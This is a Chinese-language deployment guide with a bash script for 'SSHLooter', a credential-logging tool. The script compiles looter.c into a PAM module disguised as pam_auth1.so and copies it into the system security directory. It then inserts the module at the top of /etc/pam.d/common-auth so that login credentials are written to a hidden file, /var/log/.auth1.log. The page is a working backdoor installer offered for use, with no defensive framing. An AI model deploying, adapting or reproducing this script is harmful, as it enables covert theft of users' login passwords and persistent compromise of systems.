# SSHLooter 本地记录版 - 一键部署脚本（已优化）

**C 源码文件名**：`looter.c`  
**生成模块名**：`pam_auth1.so`（已伪装）  
**日志文件**：`/var/log/.auth1.log`

---

### Debian/Ubuntu/Kali 一键脚本（`install_debian.sh`）

```bash
#!/bin/bash
echo "[+] SSHLooter 本地记录版 一键部署 - Debian/Ubuntu/Kali"

# 1. 编译（如果 looter.c 存在）
if [ -f "looter.c" ]; then
    echo "[*] 正在编译 looter.c ..."
    gcc -fPIC -shared -o pam_auth1.so looter.c -lpam
    if [ $? -ne 0 ]; then
        echo "[-] 编译失败，请检查 looter.c"
        exit 1
    fi
    echo "[√] 编译完成 → pam_auth1.so"
else
    echo "[!] 未找到 looter.c，请确保文件存在"
    exit 1
fi

# 2. 复制模块（支持 x86_64 和 aarch64）
if [ -d "/lib/x86_64-linux-gnu/security" ]; then
    sudo cp pam_auth1.so /lib/x86_64-linux-gnu/security/pam_auth1.so
elif [ -d "/lib/aarch64-linux-gnu/security" ]; then
    sudo cp pam_auth1.so /lib/aarch64-linux-gnu/security/pam_auth1.so
else
    sudo cp pam_auth1.so /lib/security/pam_auth1.so 2>/dev/null
fi

# 3. 添加到 PAM 配置（插入文件最前面）
sudo sed -i '1i auth    optional    pam_auth1.so\naccount optional    pam_auth1.so' /etc/pam.d/common-auth

# 4. 设置权限
sudo chmod 644 /lib/*/security/pam_auth1.so 2>/dev/null

# 5. 创建日志文件
sudo touch /var/log/.auth1.log
sudo chmod 644 /var/log/.auth1.log
sudo chown root:root /var/log/.auth1.log

echo "[√] 部署完成！登录凭证已记录到 /var/log/.auth1.log"
echo "    查看命令：tail -f /var/log/.auth1.log"
